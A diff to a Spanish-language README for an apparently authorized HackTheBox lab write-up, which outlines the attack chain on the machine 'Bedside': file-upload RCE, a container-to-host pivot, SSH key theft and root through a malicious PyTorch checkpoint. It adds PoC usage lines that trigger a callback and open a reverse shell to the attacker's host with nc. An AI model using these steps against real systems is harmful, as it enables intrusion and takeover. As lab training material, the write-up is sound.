@@ -6,9 +6,18 @@
 > El objetivo es que se entienda el *razonamiento de un pentester*, no solo el resultado.
 
 - **Máquina:** Bedside
-- **IP:** `10.129.248.191`
 - **Plataforma:** HackTheBox (entorno de laboratorio autorizado)
-- **Dominio:** `bedside.htb`
+- **Dominio:** `bedside.htb` · vhost: `research.bedside.htb`
+
+> ⚠️ **La IP cambia al resetear la máquina.** No hay IP fija en este README a propósito. Antes de
+> cada sesión, actualiza `/etc/hosts` con la IP actual:
+> ```bash
+> # sustituye 10.129.X.Y por la IP que te dé HTB
+> echo "10.129.X.Y  bedside.htb research.bedside.htb" | sudo tee -a /etc/hosts
+> ```
+
+> ⚠️ **Máquina ACTIVA:** publicar write-ups de máquinas activas viola las reglas de HTB. Mantener
+> este repo **privado** hasta que Bedside pase a *retired*.
 
 ---
 
@@ -31,25 +40,25 @@ Antes de los detalles técnicos, el marco mental que sigo. Toda la resolución r
 **Principios que aplico en cada fase:**
 
 1. **De lo ancho a lo estrecho (funnel).** Primero una visión amplia y barata (¿qué puertos hay?),
-   luego profundizo solo donde hay señal. No gasto tiempo en profundidad donde no hay nada.
+   luego profundizo solo donde hay señal.
 2. **Cada resultado es una pregunta nueva.** Un puerto abierto no es un fin; es "¿qué corre ahí?".
-   Un redirect a `bedside.htb` no es un estorbo; es "esto usa *virtual hosts* → ¿habrá más?".
-3. **El mínimo payload que confirma/descarta.** Para probar una idea uso lo más pequeño posible
-   (un PDF vacío, un PNG de 1 píxel). Así aíslo la variable que estoy midiendo.
-4. **Observar efectos secundarios.** No solo miro si "funciona"; miro *dónde* aterriza el archivo,
-   *qué cabeceras* devuelve, *qué mensaje* da. Ahí están las pistas.
-5. **Documentar el porqué, no solo el qué.** Si no sé explicar por qué hago algo, es que estoy
-   probando a ciegas — y eso no escala.
+3. **El mínimo payload que confirma/descarta.** Para probar una idea uso lo más pequeño posible.
+4. **Observar efectos secundarios.** No solo si "funciona"; *dónde* aterriza el archivo, *qué
+   cabeceras* devuelve, *qué mensaje* da. Ahí están las pistas.
+5. **Separar problemas.** "¿Ejecuto código?" y "¿me vuelve la shell?" son preguntas distintas; se
+   confirman por separado (ver Fase 05).
 
 ---
 
-## 📂 Estructura del repositorio
+## 🎭 Los tres actos de la máquina
 
-| Carpeta | Contenido |
-|---|---|
-| `phases/` | Una ficha por fase, con objetivo, razonamiento, comando, resultado e interpretación |
-| `scripts/` | Los scripts/comandos exactos reutilizables de cada fase |
-| `scans/` | Las salidas crudas de las herramientas (nmap, etc.) |
+| Acto | Qué consigo | Fases |
+|---|---|---|
+| **1 — Foothold** | RCE en el portal `research` (pdfminer.six) → shell **dentro de un contenedor Docker** | 01–05 |
+| **2 — Container → host (user)** | Desde el contenedor alcanzo el host (`172.17.0.1:3000`, Vite dev) → lectura de fichero arbitraria → clave SSH de `developer` → SSH al host → `user.txt` | 06–07 |
+| **3 — Root** | `sudo -l` permite correr como root un script de entrenamiento que carga un checkpoint PyTorch/MONAI → deserialización (misma *bug class*) → checkpoint malicioso → `root.txt` | 08 |
+
+---
 
 ## 🗺️ Índice de fases
 
@@ -60,12 +69,38 @@ Antes de los detalles técnicos, el marco mental que sigo. Toda la resolución r
 | [02](phases/phase-02-web-enum.md) | Enumeración web + descubrimiento del virtual host | ✅ |
 | [03](phases/phase-03-vhost-research.md) | Análisis del portal `research` (subida de archivos) | ✅ |
 | [04](phases/phase-04-upload-analysis.md) | Análisis del filtro de subida y superficie de ataque | ✅ |
-| 05 | Explotación *(en progreso)* | ⏳ |
+| [05](phases/phase-05-exploitation.md) | **Explotación → RCE → shell en el contenedor** (CVE-2025-64512) | ✅ |
+| [06](phases/phase-06-container-enum-pivot.md) | Dentro del contenedor: enumeración y pivot al host (puerto 3000) | ⏳ |
+| 07 | Lectura arbitraria en Vite dev → clave SSH de `developer` → `user.txt` | ⬜ |
+| 08 | Escalada a root vía checkpoint PyTorch/MONAI (deserialización) | ⬜ |
+
+---
+
+## 📂 Estructura del repositorio
+
+| Carpeta | Contenido |
+|---|---|
+| `phases/` | Una ficha por fase: objetivo, razonamiento, comando, resultado e interpretación |
+| `exploit/poc/` | El PoC del foothold (`exploit.py`, con modos `callback` y `pyshell`) |
+| `scripts/` | Scripts/comandos reutilizables de cada fase |
+| `scans/` | Salidas crudas de las herramientas (nmap, etc.) |
+
+### El PoC del foothold (resumen)
+```bash
+cd exploit/poc
+# 1) confirmar ejecución (callback HTTP a tu VPS)
+python3 -m http.server 8000 &
+python3 exploit.py --mode callback --lhost 10.10.14.95
+
+# 2) reverse shell en Python puro (fiable sin bash en el contenedor)
+nc -lvnp 4444 &
+python3 exploit.py --mode pyshell --lhost 10.10.14.95 --lport 4444
+```
 
 ---
 
 ## ⚙️ Entorno de trabajo
 
-- **Atacante:** VPS Linux (Ubuntu 24.04) conectado a la VPN de HTB vía OpenVPN (`tun0 = 10.10.14.95`).
-- **Herramientas:** nmap, ffuf, gobuster, curl, impacket, netexec, evil-winrm.
-- **Diccionarios:** SecLists (subdominios, directorios, ffuf) en `~/Documentos/diccionarios/`.
+- **Atacante:** VPS Linux (Ubuntu) conectado a la VPN de HTB vía OpenVPN (`tun0 = 10.10.14.95`).
+- **Herramientas:** nmap, ffuf, gobuster, curl, requests (en venv), impacket, netexec.
+- **Diccionarios:** SecLists (subdominios, directorios, ffuf).
